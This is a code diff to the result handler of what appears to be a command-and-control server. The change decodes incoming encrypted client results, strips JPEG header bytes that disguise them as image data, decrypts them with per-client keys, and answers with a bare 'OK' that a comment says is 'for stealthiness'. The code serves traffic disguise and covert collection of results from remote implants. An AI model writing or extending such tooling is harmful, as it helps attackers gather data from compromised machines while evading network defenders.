@@ -1,5 +1,6 @@
 import json
 import logging
+import base64
 from handlers.base_handler import BaseHandler
 
 logger = logging.getLogger(__name__)
@@ -43,18 +44,30 @@ class ResultHandler(BaseHandler):
                 timestamp = None
                 result = None
                 
-                # Strip JPEG header if present
-                if encrypted_data and isinstance(encrypted_data, str):
-                    # Check for and remove JPEG headers if present (exact match only)
-                    if encrypted_data.startswith("0xFFD8FF"):
-                        encrypted_data = encrypted_data[8:]  # Remove 8 chars for 0xFFD8FF
-                        self.log_message(f"Removed JPEG header prefix '0xFFD8FF' from result data")
-                    elif encrypted_data.startswith("FFD8FF"):
-                        encrypted_data = encrypted_data[6:]  # Remove 6 chars for FFD8FF
-                        self.log_message(f"Removed JPEG header prefix 'FFD8FF' from result data")
-                
                 # Try to decrypt the data
                 try:
+                    # Check for JPEG header in binary format before trying to decrypt
+                    if encrypted_data and isinstance(encrypted_data, str):
+                        # Try to decode as base64 first
+                        try:
+                            decoded_data = base64.b64decode(encrypted_data)
+                            # Check for JPEG header bytes (0xFF 0xD8 0xFF)
+                            if len(decoded_data) > 3 and decoded_data[0] == 0xFF and decoded_data[1] == 0xD8 and decoded_data[2] == 0xFF:
+                                # Remove the JPEG header (first 3 bytes)
+                                decoded_data = decoded_data[3:]
+                                self.log_message(f"Removed binary JPEG header from result data")
+                                
+                                # Re-encode to base64 for decryption
+                                encrypted_data = base64.b64encode(decoded_data).decode('utf-8')
+                        except Exception as e:
+                            # If not valid base64 or no JPEG header, check for text-based headers
+                            if encrypted_data.startswith("0xFFD8FF"):
+                                encrypted_data = encrypted_data[8:]  # Remove the exact 8 characters
+                                self.log_message(f"Removed text JPEG header '0xFFD8FF' from result data")
+                            elif encrypted_data.startswith("FFD8FF"):
+                                encrypted_data = encrypted_data[6:]  # Remove the exact 6 characters
+                                self.log_message(f"Removed text JPEG header 'FFD8FF' from result data")
+                    
                     # Decrypt using client's key if available
                     if encrypted_data and self.crypto_helper._has_unique_key(client_id):
                         result_data = self.crypto_helper.decrypt(encrypted_data, client_id)
@@ -96,7 +109,7 @@ class ResultHandler(BaseHandler):
                     # Handle unstructured result or fallbacks
                     self._handle_unstructured_result(client_id, result_data)
                 
-                # Send success response
+                # Send success response - simplified to just a standard "OK" for stealthiness
                 self.send_success_response()
                 
             except Exception as e:
